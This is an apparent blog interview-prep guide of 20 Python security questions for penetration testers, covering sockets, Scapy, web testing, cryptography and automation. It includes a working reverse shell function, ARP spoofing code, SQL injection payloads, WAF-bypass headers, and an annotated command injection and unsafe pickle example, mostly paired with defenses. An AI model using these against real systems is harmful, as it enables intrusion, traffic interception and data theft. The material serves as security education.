---
title: "Python for Cyber Security: Interview Q&A for Pentesters"
description: "20 Python security interview questions for penetration testing and InfoSec roles. Covers socket programming, Scapy, web exploitation, cryptography, and automation scripting."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python for Cyber Security: Interview Q&A for Pentesters",
    "description": "20 Python security interview questions covering socket programming, packet manipulation, web exploitation, and automation.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "en"
  }
---

## System Init

Python is the dominant language in offensive and defensive security. Penetration testing, red team, SOC analyst, and security engineering roles all require fluency in Python for automation, tool development, and rapid prototyping. Interviewers expect you to write code on the spot — from TCP socket clients to packet crafters to web exploit scripts. This guide covers 20 questions that test the intersection of Python programming and security knowledge.

**Need code snippets ready?** Keep our [Python Security Scripting Cheatsheet](/cheatsheets/python-security-scripts/) open during your prep.

---

## Networking & Sockets

<details>
<summary><strong>1. How do you create a TCP client in Python?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

Key points: `AF_INET` = IPv4, `SOCK_STREAM` = TCP. For UDP, use `SOCK_DGRAM` and `sendto()`/`recvfrom()` instead of `connect()`/`send()`/`recv()`. Always set timeouts in production scripts: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. How does a TCP three-way handshake work at the socket level?</strong></summary>
<br>

When you call `client.connect((host, port))`, Python's socket library triggers the OS to perform the three-way handshake:

1. OS sends a **SYN** packet to the server.
2. Server responds with **SYN-ACK**.
3. OS sends **ACK** — connection established, `connect()` returns.

If the handshake fails (port closed, timeout), `connect()` raises `ConnectionRefusedError` or `socket.timeout`. With Scapy, you can manually craft and send each packet to perform stealth SYN scans — sending SYN, checking for SYN-ACK, then sending RST instead of ACK to avoid completing the handshake.
</details>

<details>
<summary><strong>3. Write a multi-threaded port scanner in Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

Discussion points: Why threads and not processes (I/O bound, not CPU bound), why `connect_ex` over `connect` (returns error code instead of raising exception), and why `settimeout` is critical (prevents hanging on filtered ports).
</details>

<details>
<summary><strong>4. What is the difference between `socket.connect()` and `socket.connect_ex()`?</strong></summary>
<br>

- `connect()`: Raises an exception (`ConnectionRefusedError`, `TimeoutError`) if the connection fails. Good for scripts where failure should halt execution.
- `connect_ex()`: Returns an error code instead of raising an exception. Returns `0` on success, a non-zero errno on failure. Better for port scanners where you need to check hundreds of ports without try/except overhead.
</details>

## Scapy & Packet Manipulation

<details>
<summary><strong>5. What is Scapy and why is it preferred over raw sockets?</strong></summary>
<br>

Scapy is a Python library for interactive packet manipulation. It lets you forge, send, capture, and dissect network packets at any protocol layer.

Advantages over raw sockets:
- **Layer-by-layer construction**: Build packets by stacking protocol layers: `IP()/TCP()/Raw()`.
- **Protocol support**: Built-in support for hundreds of protocols (ARP, DNS, ICMP, TCP, UDP, 802.11).
- **Response parsing**: Automatically matches requests with responses and dissects them.
- **Interactive mode**: REPL for live packet experimentation.

Raw sockets require manual byte-level packet construction and OS-level permissions. Scapy abstracts this while giving the same level of control.
</details>

<details>
<summary><strong>6. How do you perform ARP spoofing with Scapy?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

This sends an unsolicited ARP reply telling the target that `spoof_ip` is at your MAC address. Traffic intended for `spoof_ip` is redirected to your machine. Combined with IP forwarding, this enables man-in-the-middle attacks.

**Defense**: Static ARP entries, Dynamic ARP Inspection (DAI), or ARP monitoring tools like arpwatch.
</details>

<details>
<summary><strong>7. How do you sniff network traffic and filter specific protocols?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

The `filter` parameter uses BPF (Berkeley Packet Filter) syntax. `store=0` prevents keeping packets in memory. Requires root/admin privileges.
</details>

## Web Security

<details>
<summary><strong>8. How do you automate web requests for security testing?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

Key concepts: `Session()` maintains cookies across requests. Always set `timeout` for production scripts. Use `verify=False` only in controlled test environments (disables SSL verification).
</details>

<details>
<summary><strong>9. How would you test for SQL injection using Python?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

This tests for error-based (error messages in response), union-based (altered output), and time-based blind (delayed response) SQL injection. For production pentests, use SQLMap — but interviewers expect you to understand the underlying mechanics.
</details>

<details>
<summary><strong>10. What is the difference between requests.get() and urllib?</strong></summary>
<br>

- **requests**: Third-party library. Clean API, automatic JSON parsing, session management, connection pooling, proxy support. The industry standard for HTTP in Python.
- **urllib**: Standard library. More verbose, lower-level. No session management. Useful when you cannot install third-party packages (restricted environments, lambda functions).

For security testing, `requests` is preferred for its simplicity. For exploit development where minimizing dependencies matters, `urllib` or even raw sockets may be better.
</details>

## Cryptography

<details>
<summary><strong>11. What is the difference between hashing and encryption?</strong></summary>
<br>

- **Hashing**: One-way function. Input → fixed-size digest. Cannot be reversed. Same input always produces same output. Used for integrity verification, password storage. Examples: SHA-256, bcrypt, Argon2.
- **Encryption**: Two-way function. Plaintext → ciphertext (with a key) → plaintext (with the key). Designed to be reversed by the key holder. Used for confidentiality. Examples: AES, RSA, ChaCha20.

Common mistake: Using MD5/SHA to "encrypt" data. Hashing is not encryption — you cannot recover the original data from a hash (without brute force).
</details>

<details>
<summary><strong>12. How do you implement AES encryption in Python?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet uses AES-128-CBC with HMAC-SHA256 for authenticated encryption. For lower-level control, use `cryptography.hazmat` with AES-GCM (authenticated encryption, no separate HMAC needed).

Never implement your own crypto primitives. Use established libraries.
</details>

<details>
<summary><strong>13. How do you securely hash passwords in Python?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

Why bcrypt over SHA-256: bcrypt is deliberately **slow** (configurable rounds), making brute-force attacks impractical. SHA-256 is designed to be fast — an attacker can compute billions per second with GPUs. Alternatives: Argon2 (memory-hard, recommended for new projects), PBKDF2 (widely supported).
</details>

## Automation & Scripting

<details>
<summary><strong>14. How do you handle subprocess execution securely in Python?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

Rules: Never use `shell=True` with user-controlled input. Always pass commands as lists. Set `timeout` to prevent hanging. Use `capture_output=True` to collect stdout/stderr.
</details>

<details>
<summary><strong>15. How do you parse and analyze log files with Python?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

For large files, always read line by line (never `.read()` the entire file into memory). Use `re.compile()` to precompile regex patterns for performance.
</details>

<details>
<summary><strong>16. What is the GIL and how does it affect security tools?</strong></summary>
<br>

The **Global Interpreter Lock (GIL)** prevents multiple threads from executing Python bytecode simultaneously. Only one thread runs at a time in CPython.

Impact on security tools:
- **Port scanners** (I/O-bound): Threading works fine. Threads spend most time waiting for network responses, not executing Python code. The GIL is released during I/O operations.
- **Password crackers** (CPU-bound): Threading is useless. Use `multiprocessing` to leverage multiple CPU cores, or use C extensions (hashcat, John the Ripper) for real-world cracking.
- **Alternative**: Use `asyncio` for high-concurrency network tools (thousands of simultaneous connections with minimal overhead).
</details>

## Exploit Development

<details>
<summary><strong>17. How do you craft a reverse shell payload in Python?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

This redirects stdin/stdout/stderr to a TCP socket, giving the attacker an interactive shell. In interviews, explain the concept and defense (egress filtering, network segmentation, EDR monitoring) — not just the code. This is for authorized testing and CTF challenges only.
</details>

<details>
<summary><strong>18. What is serialization and why is it a security risk?</strong></summary>
<br>

Serialization converts objects to bytes for storage/transmission. **Deserialization** of untrusted data is a critical vulnerability.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Python's `pickle` can execute arbitrary code during deserialization. An attacker can craft a pickle payload that spawns a reverse shell when loaded.

Safe alternatives: Use `json` for data exchange (no code execution possible). If you must deserialize complex objects, use `jsonschema` validation or protobuf/msgpack with strict schemas.
</details>

<details>
<summary><strong>19. How do you interact with REST APIs for OSINT gathering?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

Common OSINT APIs: Shodan (exposed devices), VirusTotal (malware analysis), Have I Been Pwned (breach data), SecurityTrails (DNS history). Always respect rate limits and terms of service.
</details>

<details>
<summary><strong>20. How do you write a Python keylogger and how do you detect one?</strong></summary>
<br>

Conceptual answer (interview context):
A keylogger hooks into the OS input system to capture keystrokes. On Linux, it reads from `/dev/input/event*` devices. On Windows, it uses the `SetWindowsHookEx` API via `ctypes` or `pynput`.

**Detection methods**:
- Monitor processes accessing input devices: `lsof /dev/input/*`.
- Check for unexpected `pynput`, `keyboard`, or `ctypes` imports in running Python processes.
- EDR/antivirus signatures for known keylogger patterns.
- Network monitoring for exfiltration (keyloggers need to send data somewhere).

In interviews, always emphasize the defensive perspective: how to detect, prevent, and respond to keyloggers — not just how to build them.
</details>
